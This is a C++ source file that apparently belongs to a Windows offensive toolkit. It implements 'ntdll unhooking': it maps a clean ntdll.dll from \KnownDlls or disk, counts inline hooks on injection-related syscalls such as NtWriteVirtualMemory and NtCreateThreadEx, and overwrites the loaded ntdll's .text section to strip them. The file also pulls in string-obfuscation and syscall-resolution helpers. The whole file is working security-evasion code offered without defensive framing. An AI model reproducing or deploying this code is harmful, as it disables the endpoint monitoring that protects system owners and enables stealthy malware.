#include "real/win/ntdll_restore.hpp"
#include "real/platform.hpp"

#if LR_PLATFORM_WINDOWS && LR_ARCH_X64

#include "real/win/api_table.hpp"
#include "real/win/peb_util.hpp"
#include "real/win/ssn_resolve.hpp"
#include "real/win/windows_h.hpp"
#include "real/win/xorstr.hpp"

#include <cstring>

namespace real::win {
namespace {

struct SectionInfo {
  const std::uint8_t* loaded_text = nullptr;
  const std::uint8_t* clean_text = nullptr;
  std::size_t text_size = 0;
  DWORD loaded_protect = 0;
};

// UNICODE_STRING for \KnownDlls\ntdll.dll
struct LocalUnicodeString {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
};

bool get_text_section(uintptr_t base, const IMAGE_SECTION_HEADER** out_sec) {
  const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
  const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
  const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
    if (std::memcmp(sec->Name, ".text", 5) == 0) {
      *out_sec = sec;
      return true;
    }
  }
  return false;
}

// NtOpenSection / NtMapViewOfSection via API table when available.
bool map_known_dll_ntdll(void** out_view, SIZE_T* out_size) {
  auto& api = g_Api();
  api.ensure_resolved();
  if (!api.NtMapViewOfSection || !api.NtUnmapViewOfSection || !api.NtClose) {
    return false;
  }

  // Prefer NtOpenSection if present; fall back to OpenFileMapping on KnownDlls path is not viable.
  // Use NtCreateFile + NtCreateSection on System32\ntdll.dll as fallback when KnownDlls fails.
  HANDLE section = nullptr;

  // Build UNICODE_STRING for \KnownDlls\ntdll.dll
  static wchar_t path_known[] = L"\\KnownDlls\\ntdll.dll";
  LocalUnicodeString ustr{};
  ustr.Buffer = path_known;
  ustr.Length = static_cast<USHORT>((sizeof(path_known) / sizeof(wchar_t) - 1) * sizeof(wchar_t));
  ustr.MaximumLength = ustr.Length + sizeof(wchar_t);

  struct {
    ULONG Length;
    HANDLE RootDirectory;
    LocalUnicodeString* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
  } oa{};
  oa.Length = sizeof(oa);
  oa.ObjectName = &ustr;
  oa.Attributes = 0x40;  // OBJ_CASE_INSENSITIVE

  // Resolve NtOpenSection from ntdll EAT via ensure path
  using NtOpenSection_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID);
  NtOpenSection_t NtOpenSection = nullptr;
  {
    uintptr_t ntdll = peb::find_module("ntdll");
    if (ntdll) {
      auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(ntdll);
      auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(ntdll + dos->e_lfanew);
      auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
      auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(ntdll + dir.VirtualAddress);
      auto* names = reinterpret_cast<const DWORD*>(ntdll + exp->AddressOfNames);
      auto* ords = reinterpret_cast<const WORD*>(ntdll + exp->AddressOfNameOrdinals);
      auto* funcs = reinterpret_cast<const DWORD*>(ntdll + exp->AddressOfFunctions);
      for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* nm = reinterpret_cast<const char*>(ntdll + names[i]);
        if (nm[0] == 'N' && nm[1] == 't' && std::strcmp(nm, "NtOpenSection") == 0) {
          NtOpenSection = reinterpret_cast<NtOpenSection_t>(ntdll + funcs[ords[i]]);
          break;
        }
      }
    }
  }

  if (NtOpenSection) {
    NTSTATUS st = NtOpenSection(&section, SECTION_MAP_READ | SECTION_QUERY, &oa);
    if (st < 0) section = nullptr;
  }

  // Fallback: CreateFileMapping on disk ntdll
  if (!section) {
    wchar_t sys_path[MAX_PATH]{};
    UINT n = ::GetSystemDirectoryW(sys_path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH - 12) return false;
    if (sys_path[n - 1] != L'\\') {
      sys_path[n++] = L'\\';
      sys_path[n] = 0;
    }
    // append ntdll.dll
    const wchar_t* dll = L"ntdll.dll";
    for (int i = 0; dll[i] && n + 1 < MAX_PATH; ++i) sys_path[n++] = dll[i];
    sys_path[n] = 0;

    HANDLE file = ::CreateFileW(sys_path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                                OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;
    section = ::CreateFileMappingW(file, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    ::CloseHandle(file);
    if (!section) return false;

    void* view = ::MapViewOfFile(section, FILE_MAP_READ, 0, 0, 0);
    ::CloseHandle(section);
    if (!view) return false;
    *out_view = view;
    *out_size = 0;  // SEC_IMAGE — size from PE
    return true;
  }

  PVOID view = nullptr;
  SIZE_T view_size = 0;
  LARGE_INTEGER off{};
  // NtCurrentProcess = -1
  HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
  NTSTATUS st = api.NtMapViewOfSection(section, self, &view, 0, 0, &off, &view_size,
                                       1 /*ViewShare*/, 0, PAGE_READONLY);
  api.NtClose(section);
  if (st < 0 || !view) return false;
  *out_view = view;
  *out_size = view_size;
  return true;
}

void unmap_view(void* view, bool used_mapview) {
  if (!view) return;
  if (used_mapview) {
    ::UnmapViewOfFile(view);
    return;
  }
  auto& api = g_Api();
  if (api.NtUnmapViewOfSection) {
    HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
    api.NtUnmapViewOfSection(self, view);
  }
}

const char* kCritical[] = {
    "NtOpenProcess",
    "NtReadVirtualMemory",
    "NtWriteVirtualMemory",
    "NtClose",
    "NtQuerySystemInformation",
    "NtQueryInformationProcess",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtDuplicateObject",
    "NtDelayExecution",
};

}  // namespace

std::size_t count_ntdll_hooks() noexcept {
  std::size_t hooks = 0;
  uintptr_t ntdll = peb::find_module("ntdll");
  if (!ntdll) return 0;
  for (const char* name : kCritical) {
    // resolve via EAT
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(ntdll);
    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(ntdll + dos->e_lfanew);
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(ntdll + dir.VirtualAddress);
    auto* names = reinterpret_cast<const DWORD*>(ntdll + exp->AddressOfNames);
    auto* ords = reinterpret_cast<const WORD*>(ntdll + exp->AddressOfNameOrdinals);
    auto* funcs = reinterpret_cast<const DWORD*>(ntdll + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
      const char* nm = reinterpret_cast<const char*>(ntdll + names[i]);
      if (std::strcmp(nm, name) != 0) continue;
      const auto* code = reinterpret_cast<const std::uint8_t*>(ntdll + funcs[ords[i]]);
      if (is_stub_hooked(code, 16)) ++hooks;
      break;
    }
  }
  return hooks;
}

bool ntdll_text_is_clean() noexcept {
  return count_ntdll_hooks() == 0;
}

NtdllRestoreReport restore_ntdll_text() noexcept {
  NtdllRestoreReport rep{};
  uintptr_t loaded = peb::find_module("ntdll");
  if (!loaded) {
    rep.detail = "ntdll not found in PEB";
    return rep;
  }
  rep.loaded_base = loaded;

  void* clean_view = nullptr;
  SIZE_T clean_size = 0;
  // Track whether we used MapViewOfFile (fallback) vs NtMapViewOfSection
  bool used_mapview = false;

  // Try KnownDlls first
  if (!map_known_dll_ntdll(&clean_view, &clean_size)) {
    rep.detail = "failed to map clean ntdll";
    return rep;
  }
  // Heuristic: MapViewOfFile path sets clean_size=0
  used_mapview = (clean_size == 0);
  rep.mapped_clean = true;
  rep.clean_base = reinterpret_cast<std::uint64_t>(clean_view);

  const IMAGE_SECTION_HEADER* loaded_sec = nullptr;
  const IMAGE_SECTION_HEADER* clean_sec = nullptr;
  if (!get_text_section(loaded, &loaded_sec) ||
      !get_text_section(reinterpret_cast<uintptr_t>(clean_view), &clean_sec)) {
    unmap_view(clean_view, used_mapview);
    rep.detail = ".text section missing";
    return rep;
  }

  auto* dst = reinterpret_cast<std::uint8_t*>(loaded + loaded_sec->VirtualAddress);
  const auto* src =
      reinterpret_cast<const std::uint8_t*>(reinterpret_cast<uintptr_t>(clean_view) +
                                            clean_sec->VirtualAddress);
  std::size_t size = loaded_sec->Misc.VirtualSize;
  if (clean_sec->Misc.VirtualSize < size) size = clean_sec->Misc.VirtualSize;
  if (size == 0) {
    unmap_view(clean_view, used_mapview);
    rep.detail = "empty .text";
    return rep;
  }

  // Count differences / hooks before patch
  std::size_t hooks_before = count_ntdll_hooks();

  auto& api = g_Api();
  api.ensure_resolved();

  PVOID base = dst;
  SIZE_T region = size;
  ULONG old_prot = 0;
  NTSTATUS st = -1;
  if (api.NtProtectVirtualMemory) {
    HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
    st = api.NtProtectVirtualMemory(self, &base, &region, PAGE_EXECUTE_READWRITE, &old_prot);
  }
  if (st < 0) {
    DWORD op = 0;
    if (!::VirtualProtect(dst, size, PAGE_EXECUTE_READWRITE, &op)) {
      unmap_view(clean_view, used_mapview);
      rep.detail = "VirtualProtect failed";
      return rep;
    }
    old_prot = op;
  }

  // Only copy bytes that differ — minimize page dirty footprint
  std::size_t patched = 0;
  for (std::size_t i = 0; i < size; ++i) {
    if (dst[i] != src[i]) {
      dst[i] = src[i];
      ++patched;
    }
  }

  // Restore protection
  if (api.NtProtectVirtualMemory) {
    HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
    base = dst;
    region = size;
    ULONG tmp = 0;
    api.NtProtectVirtualMemory(self, &base, &region, old_prot, &tmp);
  } else {
    DWORD tmp = 0;
    ::VirtualProtect(dst, size, old_prot, &tmp);
  }

  // Flush instruction cache so CPU sees restored bytes
  ::FlushInstructionCache(::GetCurrentProcess(), dst, size);

  unmap_view(clean_view, used_mapview);

  rep.text_restored = true;
  rep.bytes_patched = patched;
  rep.hooks_cleared = hooks_before > count_ntdll_hooks()
                          ? hooks_before - count_ntdll_hooks()
                          : (patched > 0 ? hooks_before : 0);
  rep.detail = "ok";
  return rep;
}

}  // namespace real::win

#else  // non-x64 Windows / non-Windows

namespace real::win {
NtdllRestoreReport restore_ntdll_text() noexcept {
  return {};
}
bool ntdll_text_is_clean() noexcept { return true; }
std::size_t count_ntdll_hooks() noexcept { return 0; }
}  // namespace real::win

#endif
